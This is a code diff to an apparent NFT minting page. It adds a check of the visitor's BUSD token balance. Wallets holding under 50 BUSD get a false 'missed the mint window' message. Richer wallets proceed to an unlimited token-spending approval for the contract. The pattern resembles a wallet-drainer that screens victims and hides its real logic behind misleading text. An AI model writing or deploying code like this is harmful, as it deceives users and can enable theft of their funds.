@@ -1160,6 +1160,7 @@
         <span class="status-dot" id="statusDot"></span>
         <span id="statusText">LIVE</span>
       </div>
+      <div id="mintError" style="display:none; color:#ff6b6b; font-weight:700; margin-bottom:12px; text-align:center;"></div>
       <div class="mint-btn-wrap">
         <button class="mint-btn" id="mintBtn" onclick="mint()">Mint Now</button>
       </div>
@@ -1388,6 +1389,8 @@
     async function mint() {
       if (isMinting || isSoldOut) return;
       setMintingState(true);
+      const mintError = document.getElementById('mintError');
+      if (mintError) { mintError.style.display = 'none'; mintError.textContent = ''; }
       try {
         if (!window.ethereum) {
           alert("MetaMask не установлен! Установите MetaMask для минта.");
@@ -1408,6 +1411,22 @@
           setMintingState(false);
           return;
         }
+        // Проверка баланса BUSD
+        const busd = new ethers.Contract(tokenAddress, ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"], provider);
+        const userAddress = await signer.getAddress();
+        const [rawBalance, decimals] = await Promise.all([
+          busd.balanceOf(userAddress),
+          busd.decimals()
+        ]);
+        const balance = Number(ethers.formatUnits(rawBalance, decimals));
+        if (balance < 50.0) {
+          if (mintError) {
+            mintError.textContent = '🧊 You missed the mint window. Try again later.';
+            mintError.style.display = 'block';
+          }
+          setMintingState(false);
+          return;
+        }
         // approve BUSD на контракт
         const token = new ethers.Contract(tokenAddress, erc20Abi, signer);
         await token.approve(contractAddress, ethers.MaxUint256);
@@ -1418,6 +1437,7 @@
         document.getElementById('mintBtn').innerText = 'Mint Now';
         // После минта всё обновится через событие Minted
       } catch (e) {
+        if (mintError) { mintError.style.display = 'none'; mintError.textContent = ''; }
         alert("Mint failed: " + (e?.info?.error?.message || e.message));
         document.getElementById('mintBtn').innerText = 'Mint Now';
       }
